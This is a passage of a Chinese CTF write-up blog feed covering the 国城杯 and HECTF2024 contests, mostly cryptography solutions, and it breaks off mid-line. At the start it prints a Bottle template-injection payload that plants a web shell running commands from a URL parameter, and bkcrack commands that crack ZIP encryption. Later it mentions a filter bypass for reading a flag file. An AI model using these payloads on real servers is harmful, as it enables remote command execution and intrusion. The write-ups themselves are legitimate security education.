xxx</code>这本身就是一个错误的语法，为了让它可以通过语法检测(然而语法检测这种东西肯定针对的是代码)，将它变成<strong>字符串</strong>就可以了，所以用引号包裹就可以绕过<code>AST</code>的检测</p><p><code>payload</code>的话，这里好像只有<strong>内存马</strong>生效了，其他的可以多试几次就可以了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">% from bottle import Bottle, request</span></span><br><span class="line"><span class="string">% app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]</span></span><br><span class="line"><span class="string">% app.route(&quot;/shell&quot;,&quot;GET&quot;,lambda :__import__(&#x27;os&#x27;).popen(request.params.get(&#x27;cmd&#x27;)).read())</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="mybrave"><a class="markdownIt-Anchor" href="#mybrave"></a> mybrave</h2><p>先爆破一下密码，发现好像爆不出来，然后注意到压缩包里面是图片，使用<strong>bkcrack进行已知明文攻击</strong>(这里是符合攻击条件的)，因为<strong>png头是固定的</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -r 1..12 ?p</span><br><span class="line"></span><br><span class="line">.\bkcrack.exe -C .\mybrave.zip -c mybrave.png -k 97d30dcc 173b15a8 6e0e7455 -d mybrave.png</span><br></pre></td></tr></table></figure><p>一开始爆12位密码无果，还是直接恢复出来吧<br />提取图片尾的字符<strong>解base64</strong>即可</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ul><li><a href="https://seandictionary.top/ghctf-2025/">https://seandictionary.top/ghctf-2025/</a></li><li><a href="https://tover.xyz/">https://tover.xyz/</a></li><li><a href="https://tangcuxiaojikuai.xyz/">https://tangcuxiaojikuai.xyz/</a></li><li><a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">https://suhanhan-cpu.github.io/2025/03/19/2025 GHCTF Writeup/</a></li><li><a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw</a></li><li><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">https://www.cnblogs.com/EddieMurphy-blogs/p/18296185</a></li><li><a href="https://xyaxxya.github.io/posts/2b7eb6e9.html">https://xyaxxya.github.io/posts/2b7eb6e9.html</a></li><li><a href="https://hyggevv.github.io/2025/03/07/GHCTF2025">https://hyggevv.github.io/2025/03/07/GHCTF2025</a></li></ul><p>唉，也只能四处抄抄学学了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;诶，这里有老登偷偷炸鱼(bushi&lt;/p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#crypto&quot;&gt;&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;p&gt;无意中发现了一个&lt;strong&gt;在线Sagemath运行平台&lt;/str</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>国城杯&amp;&amp;HECTF2024</title>
    <link href="https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/"/>
    <id>https://hvang10.github.io/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF-HECTF2024/</id>
    <published>2024-12-08T15:48:30.000Z</published>
    <updated>2025-04-10T15:19:27.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="国城杯"><a class="markdownIt-Anchor" href="#国城杯"></a> 国城杯</h1><p>这次比赛的<code>web</code>比较有难度(题解居然比<code>pwn</code>少，而且是少很多很多)，交给学弟，然后学弟下午出去玩，那就没人打<code>web</code>了，因为我被<code>圆锥曲线</code>卡住了QWQ</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="babyrsa"><a class="markdownIt-Anchor" href="#babyrsa"></a> babyRSA</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">p, q</span>):</span><br><span class="line">    public_key = p*p*q</span><br><span class="line">    e = public_key</span><br><span class="line">    n = p*q</span><br><span class="line">    phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    private_key = inverse(e,phi_n)</span><br><span class="line">    <span class="keyword">return</span> public_key,private_key,e</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">N,d,e = gen_key(p,q)</span><br><span class="line"></span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line"><span class="string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line"><span class="string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>Schmidt Samoa</code>密码体系，见<a href="https://hvang10.github.io/2024/05/10/%E5%A4%8D%E7%8E%B0%E8%AE%A1%E5%88%92%E2%80%94%E2%80%94NewStarCTF-2023/">crypto-week4-RSA Variation II</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span></span><br><span class="line">d = <span class="number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span></span><br><span class="line">c = <span class="number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span></span><br><span class="line">pq = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, d*N, N)-<span class="number">2</span>, N)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c, d, pq))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="ez_sign"><a class="markdownIt-Anchor" href="#ez_sign"></a> EZ_sign</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random,os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;D0g3xGC&#123;***************&#125;&#x27;</span></span><br><span class="line">msg = <span class="string">b&#x27;e = ?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">pub, pri, k</span>):</span><br><span class="line">    (p,q,g,y) = pub</span><br><span class="line">    x = pri</span><br><span class="line">    r = <span class="built_in">int</span>(powmod(g, k, p) % q)</span><br><span class="line">    H = bytes_to_long(sha1(os.urandom(<span class="number">20</span>)).digest())</span><br><span class="line">    s = <span class="built_in">int</span>((H + r * x) * invert(k, q) % q)</span><br><span class="line">    <span class="keyword">return</span> (H,r,s)</span><br><span class="line"></span><br><span class="line">k1 = getPrime(<span class="number">64</span>)</span><br><span class="line">k2 = k1 ** <span class="number">2</span></span><br><span class="line">pri = bytes_to_long(msg)</span><br><span class="line">a = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">b = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">pub = (a, b, g, y)</span><br><span class="line"></span><br><span class="line">H1, r1, s1 = sign(pub, pri, k1)</span><br><span class="line"></span><br><span class="line">H2, r2, s2 = sign(pub, pri, k2)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = powmod(bytes_to_long(flag), e, n)</span><br><span class="line"></span><br><span class="line">C = p**<span class="number">2</span> + q**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H1, r1, s1) = <span class="subst">&#123;H1&#125;</span>, <span class="subst">&#123;r1&#125;</span>, <span class="subst">&#123;s1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;(H2, r2, s2) = <span class="subst">&#123;H2&#125;</span>, <span class="subst">&#123;r2&#125;</span>, <span class="subst">&#123;s2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(H1, r1, s1) = 659787401883545685817457221852854226644541324571, 334878452864978819061930997065061937449464345411, 282119793273156214497433603026823910474682900640</span></span><br><span class="line"><span class="string">(H2, r2, s2) = 156467414524100313878421798396433081456201599833, 584114556699509111695337565541829205336940360354, 827371522240921066790477048569787834877112159142</span></span><br><span class="line"><span class="string">c = 18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line"><span class="string">C = 179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>熟悉的签名——<code>DSA</code>，找了一圈，找到了<code>关系k攻击</code><br /><img src="https://pic1.zhimg.com/80/v2-b9a34619a42f211a202b8fab91dd542a_1440w.png" alt="" /><br /><a href="http://www.cynthia99.link/index.php/archives/2426/">参考博客</a></p><p>现在差个平方和待解决，本来想用<code>sage</code>自带的<code>two_squares</code>，但出来的两个都不是素数，就很奇怪，说明这里的分解应该是没有满足特定的条件</p><p>那只能换一个打法了<br /><a href="https://xz.aliyun.com/t/15424">解丢番图方程</a><br />貌似还有一个打法——<code>复数的模长</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.solvers.diophantine.diophantine <span class="keyword">import</span> cornacchia</span><br><span class="line"></span><br><span class="line">p = <span class="number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span></span><br><span class="line">q = <span class="number">829396411171540475587755762866203184101195238207</span></span><br><span class="line">g = <span class="number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span></span><br><span class="line">y = <span class="number">97644672217092534422903769459190836176879315123054001151977789291649564201120414036287557280431608390741595834467632108397663276781265601024889217654490419259208919898180195586714790127650244788782155032615116944102113736041131315531765220891253274685646444667344472175149252120261958868249193192444916098238</span></span><br><span class="line"></span><br><span class="line">(H1, r1, s1) = <span class="number">659787401883545685817457221852854226644541324571</span>, <span class="number">334878452864978819061930997065061937449464345411</span>, <span class="number">282119793273156214497433603026823910474682900640</span></span><br><span class="line">(H2, r2, s2) = <span class="number">156467414524100313878421798396433081456201599833</span>, <span class="number">584114556699509111695337565541829205336940360354</span>, <span class="number">827371522240921066790477048569787834877112159142</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class="line"></span><br><span class="line">f = s2*x^<span class="number">2</span>*r1 - s1*x*r2 - H2*r1 + H1*r2</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">int</span>(f.roots()[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">x = (s1*k - H1) * inverse(r1, q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(x).decode())</span><br><span class="line">c = <span class="number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span></span><br><span class="line">C = <span class="number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span></span><br><span class="line">x1 = cornacchia(<span class="number">1</span>, <span class="number">1</span>, C)</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> x1:</span><br><span class="line">    <span class="keyword">assert</span> a**<span class="number">2</span>+b**<span class="number">2</span> == C</span><br><span class="line">    <span class="keyword">if</span> isPrime(a) <span class="keyword">and</span> isPrime(b):</span><br><span class="line">        p, q = a, b</span><br><span class="line">        <span class="built_in">print</span>(p,q)</span><br><span class="line">        n = p*q</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = inverse(e, phi)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><p>emmm，后面比较了一下时间，在复数域下分解所需的时间是短很多的，原题可见<strong>Geek Challenge 2023 EzComplex</strong><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>+</mo><mi>q</mi><mi>i</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mi>q</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">N=(p+qi)*(p-qi)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">N</span>):</span><br><span class="line">    <span class="comment">#将 N 转换为复数域上的整数</span></span><br><span class="line">    f = ZZ[I](N)</span><br><span class="line">    <span class="comment">#获取所有因子</span></span><br><span class="line">    divisors_f = divisors(f)</span><br><span class="line">    <span class="comment">#遍历所有因子，寻找满足条件的p和q</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> divisors_f:</span><br><span class="line">        a,b = d.real(), d.imag()</span><br><span class="line">        <span class="keyword">if</span> a**<span class="number">2</span> + b**<span class="number">2</span> == N:</span><br><span class="line">            p = <span class="built_in">abs</span>(<span class="built_in">int</span>(a))</span><br><span class="line">            q = <span class="built_in">abs</span>(<span class="built_in">int</span>(b))</span><br><span class="line">            <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">                <span class="keyword">return</span> p,q</span><br></pre></td></tr></table></figure><h3 id="curve"><a class="markdownIt-Anchor" href="#curve"></a> Curve</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">    (x1, y1) = P</span><br><span class="line">    (x2, y2) = Q</span><br><span class="line"></span><br><span class="line">    x3 = (x1*y2 + y1*x2) * inverse(<span class="number">1</span> + d*x1*x2*y1*y2, p) % p</span><br><span class="line">    y3 = (y1*y2 - a*x1*x2) * inverse(<span class="number">1</span> - d*x1*x2*y1*y2, p) % p</span><br><span class="line">    <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, P</span>):</span><br><span class="line">    Q = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add(Q, P)</span><br><span class="line">        P = add(P, P)</span><br><span class="line">        x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">p = <span class="number">64141017538026690847507665744072764126523219720088055136531450296140542176327</span></span><br><span class="line">a = <span class="number">362</span></span><br><span class="line">d = <span class="number">7</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">gx=bytes_to_long(<span class="string">b&#x27;D0g3xGC&#123;*****************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;y&gt;=PolynomialRing(Zmod(p))</span><br><span class="line">f=(d*gx^<span class="number">2</span>-<span class="number">1</span>)*y^<span class="number">2</span>+(<span class="number">1</span>-a*gx^<span class="number">2</span>)</span><br><span class="line">gy=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (a*gx^<span class="number">2</span>+gy^<span class="number">2</span>)%p==(<span class="number">1</span>+d*gx^<span class="number">2</span>*gy^<span class="number">2</span>)%p</span><br><span class="line"></span><br><span class="line">G=(gx,gy)</span><br><span class="line"></span><br><span class="line">eG = mul(e, G)</span><br><span class="line"><span class="built_in">print</span>(eG)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eG = (34120664973166619886120801966861368419497948422807175421202190709822232354059, 11301243831592615312624457443883283529467532390028216735072818875052648928463)</span></span><br></pre></td></tr></table></figure><p>考点：<code>爱德华扭曲曲线</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mo>≡</mo><mn>1</mn><mo>+</mo><mi>d</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax^{2}+y^{2}\equiv 1+dx^{2}y^{2}(mod\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></p><p><code>圆锥曲线</code>(不是椭圆曲线！！！)，吐了，然后去找了大半圈，没找到一篇能利用的</p><p>关于曲线的话，上一次印象比较深刻的是，羊城杯的两题椭圆曲线，然后也去看了一下，顺便复习一下，也是没能有进展，而且网上是比较少关于圆锥曲线的介绍的(有这玩意吗？我当时的想法就是这样的)<br />其实我应该想到映射这玩意的(属于是马后炮了)</p><p>赛后<code>Lst4r师傅</code>告诉我是这个<a href="https://en.wikipedia.org/wiki/Twisted_Edwards_curve">Twisted_Edwards_curve</a></p><p>我问他当时咋想到这个的，他说是羊城杯的时候，做那两题椭圆曲线的时候，翻到的，见过，所以有印象，好好好</p><p>然后解题脚本<a href="https://tangcuxiaojikuai.xyz/post/187210a7.html">糖醋小鸡块师傅收录曲线趣题</a></p><p>说起这个，也是有点内个了，我去师傅的博客搜<code>curve</code>的时候，点过了这篇，然后它刚好在第一题，我就没怎么注意，可能还是用的<code>Ctrl+f</code>，然后直接往下拉，结果就是完美错过了QWQ</p><p>后面看了出题人的<code>wp</code>，<code>羊城杯</code>，<code>灵感来源</code>，好好好</p><p>真是应了<code>Csome</code>那句话<br /><strong>在这CINTA是基础，Sagemath是工具，糖醋小鸡块的blog是弹药库</strong></p><h1 id="hectf2024"><a class="markdownIt-Anchor" href="#hectf2024"></a> HECTF2024</h1><p>这次也是没时间充当<code>web手</code>了，一边打密码，一边写作业，真折磨</p><p>说实话还是挺想打<code>web</code>的，看了一下反序列化那题，感觉构造链子应该不难，重点是绕过，但我感觉给防死了，结果是要拿正则表达式匹配绕过啊，<code>/bin/ca[t] fla[g]</code>(不是单纯的<code>cat</code>哦)</p><p>真就，<strong>过滤的越严格，过滤的越简单</strong></p><p>说起来，正好最近的网络空间安全的课程实验打的<code>iwebsec</code>的靶场有命令过滤绕过，我自己也想到了正则表达式匹配，但这里大脑死机了，可能是事情太多了</p><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h2><h3 id="迷茫的艾米莉"><a class="markdownIt-Anchor" href="#迷茫的艾米莉"></a> 迷茫的艾米莉</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏</span><br><span class="line">一天，她发现通往秘密花园的小径，入口却被封上了</span><br><span class="line">上面有一串密文</span><br><span class="line">Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c&#125;&#123;lr</span><br><span class="line">请输入密码帮助艾米莉探索秘密花园</span><br></pre></td></tr></table></figure><p>题目直接就告诉了你所有关键信息<br /><img src="https://pic1.zhimg.com/80/v2-1ad756efbef37b149d62b73a955770b0_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-58a35075719f46e3bd7efc1b9aa24de9_1440w.png" alt="" /></p><h3 id="翻一翻"><a class="markdownIt-Anchor" href="#翻一翻"></a> 翻一翻</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">emirp</span>(<span class="params">x</span>):</span><br><span class="line">    y = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x !=<span class="number">0</span>:</span><br><span class="line">        y = y*<span class="number">10</span> + x%<span class="number">10</span></span><br><span class="line">        x = x//<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = emirp(p)</span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64encode(flag)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"><span class="string">c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line"><span 